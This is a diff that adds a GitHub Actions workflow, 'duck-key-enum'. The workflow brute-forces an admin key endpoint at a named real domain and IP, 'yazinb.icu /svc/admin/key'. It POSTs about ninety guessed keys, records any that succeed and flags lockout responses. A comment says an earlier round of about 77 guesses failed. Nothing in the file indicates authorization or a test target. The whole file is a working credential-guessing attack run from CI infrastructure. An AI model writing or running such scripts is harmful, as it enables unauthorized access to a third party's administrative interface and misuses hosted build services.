@@ -1,0 +1,54 @@
+name: duck-key-enum
+on:
+  workflow_dispatch:
+jobs:
+  enum:
+    runs-on: ubuntu-latest
+    steps:
+      - name: duck toolbox single-key enumeration against 119.28.135.153 (yazinb.icu /svc/admin/key)
+        run: |
+          set +e
+          URL="https://yazinb.icu/svc/admin/key"
+          echo "=== reachability pre-check (benign) ==="
+          curl -skS -m 20 -o /dev/null -w "yazinb.icu -> HTTP %{http_code}\n" "$URL" || echo "PRECHECK FAILED"
+          # Candidate keys NOT in prior #2059 list (~77 tried, all miss). Fresh expanded set:
+          KEYS=(
+            "yazinb.icu2024" "yazinb.icu2025" "yazinb.icu2026" "ducktoolbox2024" "ducktoolbox2025"
+            "ducktoolbox2026" "ducktoolbox123" "YazinbAdmin" "yazinb_admin" "admin_yazinb"
+            "ffauth2024" "ffauth2025" "ffauth2026" "ffauth_key" "FFAuth"
+            "ffauthadmin" "duckbox2024" "duckbox2025" "duckbox2026" "toolbox2026"
+            "pan.yazinb" "pan.yazinb.icu" "pan2024" "pan2025" "pan2026"
+            "yazinb2024!" "yazinb2025!" "yazinb.com" "www.yazinb" "yazinb.top"
+            "yazinb.cn" "rootyazinb" "yazinb_root" "adminyazinb2025" "yazinb2025admin"
+            "duckyazinb" "yazinbduck" "flashfire" "flashfiretoolbox" "flashfireauth"
+            "flashfire2024" "flashfire2025" "flashfire2026" "ff2024" "ff2025" "ff2026"
+            "ffadmin" "ffkey" "ff_auth" "yazinbpass2025" "duckpass2025"
+            "toolboxpass2025" "yazinb123456" "duck123456" "adminyazinb123" "yazinb888"
+            "Yazinb123" "Duck123" "Toolbox123" "ffauth888" "miyazi123"
+            "xiaomi123" "oppo123" "vivo123" "yazinb2023" "duck2023" "toolbox2023"
+            "ffauth2023" "flashfire2023" "yaz2025" "yazu2025" "zryrom"
+            "zry2024" "zry2025" "zry2026" "romrelay" "kernel_triangle"
+            "duck-kernel-triangle" "zry-rom-relay" "adminkey" "keyadmin" "admin_key123"
+            "yazinb_key" "key_yazinb" "duck_key" "key_duck" "qaswed1234567"
+            "qaswed" "Qaswed123" "qaswed2025" "yazinb2025!!" "DuckToolbox2025!"
+          )
+          HITS=""
+          COUNT=0
+          for k in "${KEYS[@]}"; do
+            CODE=$(curl -skS -m 15 -o /tmp/body.txt -w "%{http_code}" -X POST "$URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"key\":\"$k\"}" 2>/dev/null)
+            BODY=$(head -c 300 /tmp/body.txt | tr -d '\n')
+            if [ "$CODE" = "200" ]; then
+              echo "HIT | status=$CODE | key='$k' | body=$BODY"
+              HITS="$HITS|$k"
+            else
+              # detect lockout/rate-limit signal in non-200 body
+              echo "miss | status=$CODE | key='$k' | body=$BODY"
+              echo "$BODY" | grep -qiE "too many|locked|rate|block|ban|lock" && echo "  >> POSSIBLE_LOCKOUT_SIGNAL"
+            fi
+            COUNT=$((COUNT+1))
+            sleep 1
+          done
+          echo "=== SUMMARY: $COUNT keys tested, HITS=${HITS:-NONE} ==="
+          if [ -z "$HITS" ]; then echo "NO_KEY_FOUND"; else echo "KEY_FOUND$HITS"; fi
